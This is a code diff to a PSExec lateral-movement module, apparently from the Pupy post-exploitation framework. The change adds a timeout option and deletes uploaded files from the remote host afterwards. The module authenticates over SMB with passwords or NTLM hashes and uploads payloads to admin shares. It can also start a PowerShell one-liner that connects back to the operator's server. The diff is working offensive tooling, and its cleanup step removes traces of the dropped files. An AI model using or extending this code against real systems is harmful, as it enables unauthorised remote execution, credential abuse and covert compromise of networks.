@@ -33,6 +33,8 @@ class PSExec(PupyModule):
         self.arg_parser.add_argument("-H", metavar="HASH", dest='hash', default='', help='NTLM hash')
         self.arg_parser.add_argument("-d", metavar="DOMAIN", dest='domain', default="WORKGROUP", help="Domain name (default WORKGROUP)")
         self.arg_parser.add_argument("-s", metavar="SHARE", dest='share', default="C$", help="Specify a share (default C$)")
+        self.arg_parser.add_argument("-T", metavar="TIMEOUT", dest='timeout', default=30, type=int,
+                                         help="Try to set this timeout")
         self.arg_parser.add_argument("--port", dest='port', type=int, choices={139, 445}, default=445, help="SMB port (default 445)")
         self.arg_parser.add_argument("target", nargs=1, type=str, help="The target range or CIDR identifier")
 
@@ -59,6 +61,7 @@ class PSExec(PupyModule):
         remote_path = ''
         dst_folder = ''
         file_to_upload = []
+        files_uploaded = []
         if args.file or args.ps1:
 
             tmp_dir = tempfile.gettempdir()
@@ -112,10 +115,11 @@ class PSExec(PupyModule):
 
                 self.info("Uploading file to {0}".format(dst))
                 upload(self.client.conn, src, dst, chunk_size=4*1024*1024)
+                files_uploaded.append(dst)
                 self.success("File uploaded")
 
         if args.ps1_oneliner:
-            res=self.client.conn.modules['pupy'].get_connect_back_host()
+            res = self.client.conn.modules['pupy'].get_connect_back_host()
             ip, port = res.rsplit(':', 1)
 
             no_use_proxy = ''
@@ -137,19 +141,27 @@ class PSExec(PupyModule):
 
             self.success('server started (pid: %s)' % process.pid)
 
-        with redirected_stdo(self):
-            for host in hosts:
-                self.info("Connecting to the remote host: %s" % host)
-                self.client.conn.modules["pupyutils.psexec"].connect(
-                    host, args.port, args.user, args.passwd, args.hash,
-                    args.share, file_to_upload, remote_path, dst_folder,
-                    args.command, args.domain, args.execm, args.codepage
-                )
+        try:
+            with redirected_stdo(self):
+                for host in hosts:
+                    self.client.conn.modules["pupyutils.psexec"].connect(
+                        host, args.port, args.user, args.passwd, args.hash,
+                        args.share, file_to_upload, remote_path, dst_folder,
+                        args.command, args.domain, args.execm, args.codepage,
+                        args.timeout
+                    )
 
-            if args.ps1_oneliner:
-                self.warning('stopping the local server (pid: %s)' % process.pid)
-                process.terminate()
+                if args.ps1_oneliner:
+                    self.warning('stopping the local server (pid: %s)' % process.pid)
+                    process.terminate()
 
-            elif args.ps1:
-                self.warning('Do not forget to remove the file: %s' % dst_folder + first_stage)
-                self.warning('Do not forget to remove the file: %s' % dst_folder + second_stage)
+                elif args.ps1:
+                    self.warning('Do not forget to remove the file: %s' % dst_folder + first_stage)
+                    self.warning('Do not forget to remove the file: %s' % dst_folder + second_stage)
+
+        finally:
+            for file in files_uploaded:
+                try:
+                    self.client.conn.modules.os.unlink(file)
+                except:
+                    pass
